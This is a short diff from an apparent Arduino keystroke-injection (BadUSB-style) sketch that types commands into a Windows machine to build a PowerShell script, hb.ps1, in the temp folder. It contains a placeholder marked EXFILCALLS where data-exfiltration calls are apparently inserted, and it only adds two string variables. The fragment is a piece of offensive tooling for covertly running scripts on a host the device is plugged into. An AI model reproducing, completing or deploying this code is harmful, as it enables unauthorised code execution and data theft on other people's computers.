@@ -30,6 +30,8 @@ void setup(){
   Keyboard.println("echo $exec++  >> %temp%\\hb.ps1");
   Keyboard.println("echo if ($exec -eq 1){ >> %temp%\\hb.ps1");
 
+  String fn = "hb";
+  String fp;
   EXFILCALLS
 
   Keyboard.println("echo sleep 60 }}  >> %temp%\\hb.ps1");
